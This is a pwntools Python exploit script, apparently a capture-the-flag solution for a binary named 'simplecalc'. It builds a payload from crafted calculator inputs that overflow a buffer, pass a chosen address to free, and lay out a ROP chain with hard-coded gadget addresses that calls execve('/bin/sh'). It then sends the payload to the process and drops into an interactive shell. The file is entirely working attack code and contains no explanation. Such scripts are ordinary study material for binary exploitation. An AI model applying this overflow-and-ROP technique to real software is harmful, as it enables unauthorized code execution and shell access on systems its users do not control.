from pwn import *

binary = context.binary = ELF("./simplecalc")

rdi_gadget = 0x401b73
rsi_gadget = 0x401c87
rdx_gadget = 0x437a85
rax_gadget = 0x44db34
syscall_gadget = 0x4b054b

calc_buff_addr = 0x6c8bf0
shell_addr = 0x6c8c80
shell_str1 = b"/bin"
shell_str2 = b"/sh\x00"

if args.GDB:
    p = gdb.debug(binary.path, gdbscript='b *main + 450')
else:
    p = process(binary.path)

payload =  b""
payload += b"80\n"
for _ in range(12):
    payload += b"1\n16843009\n1077952576\n"

# add address of calc_buff to free
payload += b"1\n" + str(calc_buff_addr-100).encode() + b"\n100\n"
payload += b"2\n1000\n1000\n"

for _ in range(4):
    payload += b"1\n16843009\n1077952576\n"

# setup rop chain
# $rdi = "/bin/sh"
payload += b"1\n" + str(rdi_gadget - 100).encode() + b"\n100\n"
payload += b"2\n1000\n1000\n"
payload += b"1\n" + str(shell_addr - 100).encode() + b"\n100\n"
payload += b"2\n1000\n1000\n"

# $rsi = 0
payload += b"1\n" + str(rsi_gadget - 100).encode() + b"\n100\n"
payload += b"2\n1000\n1000\n"
payload += b"2\n1000\n1000\n"
payload += b"2\n1000\n1000\n"

# $rdx = 0
payload += b"1\n" + str(rdx_gadget - 100).encode() + b"\n100\n"
payload += b"2\n1000\n1000\n"
payload += b"2\n1000\n1000\n"
payload += b"2\n1000\n1000\n"

# $rax = 59
payload += b"1\n" + str(rax_gadget - 100).encode() + b"\n100\n"
payload += b"2\n1000\n1000\n"
payload += b"2\n1059\n1000\n"
payload += b"2\n1000\n1000\n"

# syscall
payload += b"1\n" + str(syscall_gadget - 100).encode() + b"\n100\n"
payload += b"2\n1000\n1000\n"

# "/bin/sh" string
payload += b"1\n" + str(int.from_bytes(shell_str1, "little") - 100).encode() + b"\n100\n"
payload += b"1\n" + str(int.from_bytes(shell_str2, "little") - 100).encode() + b"\n100\n"

payload += b"5\n"

with open("payload", "wb") as fp:
    fp.write(payload)

p.send(payload)
p.interactive()